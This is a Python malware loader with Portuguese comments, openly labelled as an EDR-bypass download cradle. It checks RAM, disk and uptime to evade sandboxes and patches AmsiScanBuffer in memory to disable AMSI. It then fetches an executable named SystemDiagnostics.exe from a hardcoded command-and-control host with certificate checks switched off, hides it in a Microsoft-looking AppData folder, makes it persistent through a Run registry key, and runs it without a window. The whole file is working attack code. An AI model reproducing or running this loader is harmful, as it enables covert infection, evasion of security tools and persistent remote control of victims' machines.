# pyramid_cradle.py — Pyramid-style cradle para bypass de EDR
# Executa dentro de python.exe (binário assinado pela Microsoft)
# python.exe tem alta reputação e enorme telemetria legítima
#
# Uso:
#   python pyramid_cradle.py                    (modo padrão)
#   python.exe pyramid_cradle.py                (sem janela)
#   pythonw.exe pyramid_cradle.py               (sem console)

import sys
import os
import time
import base64
import hashlib
import urllib.request
import tempfile
import subprocess
import ctypes

# ── Configuração ──────────────────────────────────────────────────────────────
C2_HOST = "c2.convert1ri.com"
C2_PORT = "443"
LOADER_PATH = "/download/SystemDiagnostics.exe"

# ── Anti-sandbox ──────────────────────────────────────────────────────────────
def detect_sandbox():
    """Detecta ambientes de sandbox/VM"""
    # RAM < 3.8GB
    try:
        import ctypes.wintypes
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        if mem.ullTotalPhys < 3800000000:
            return True
    except:
        pass

    # Disco < 60GB
    try:
        import string
        for drive in string.ascii_uppercase:
            free = ctypes.windll.kernel32.GetDiskFreeSpaceEx(f"{drive}:\\", None, None, None)
            if free:
                total = ctypes.c_ulonglong()
                free_bytes = ctypes.c_ulonglong()
                avail = ctypes.c_ulonglong()
                ctypes.windll.kernel32.GetDiskFreeSpaceEx(f"{drive}:\\", ctypes.byref(total), ctypes.byref(free_bytes), ctypes.byref(avail))
                if total.value < 60000000000:
                    return True
    except:
        pass

    # Uptime < 10 minutos
    try:
        import ctypes.wintypes
        kernel32 = ctypes.windll.kernel32
        tick_count = kernel32.GetTickCount64()
        if tick_count < 600000:  # 10 minutos em ms
            return True
    except:
        pass

    return False

# ── AMSI bypass (executa antes de qualquer operação) ────────────────────────────
def bypass_amsi():
    """Bypass AMSI via amsiContext patching"""
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        amsi = kernel32.GetModuleHandleW("amsi.dll")
        if amsi:
            proc = kernel32.GetProcAddress(amsi, "AmsiScanBuffer")
            if proc:
                old_protect = ctypes.c_ulong()
                kernel32.VirtualProtect(proc, 6, 0x40, ctypes.byref(old_protect))
                patch = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
                ctypes.memmove(proc, patch, len(patch))
                kernel32.VirtualProtect(proc, 6, old_protect, ctypes.byref(old_protect))
    except:
        pass

# ── Download e execução ───────────────────────────────────────────────────────
def download_and_execute():
    """Baixa e executa o loader"""
    # Anti-sandbox
    if detect_sandbox():
        return

    # AMSI bypass
    bypass_amsi()

    # Diretório de alta reputação
    appdata = os.environ.get('APPDATA', '')
    dir_path = os.path.join(appdata, 'Microsoft', 'Windows', 'Caches')
    os.makedirs(dir_path, exist_ok=True)
    exe_path = os.path.join(dir_path, 'SystemDiagnostics.exe')

    # Download
    url = f"https://{C2_HOST}:{C2_PORT}{LOADER_PATH}"
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        response = urllib.request.urlopen(req, context=ctx)
        data = response.read()

        if len(data) > 10000 and data[0] == 0x4D and data[1] == 0x5A:
            with open(exe_path, 'wb') as f:
                f.write(data)

            # Persistência via Run key
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, f'"{exe_path}"')
                winreg.CloseKey(key)
            except:
                pass

            # Executar
            subprocess.Popen([exe_path], creationflags=0x08000000)  # CREATE_NO_WINDOW
    except:
        pass

# ── Main ───────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    download_and_execute()
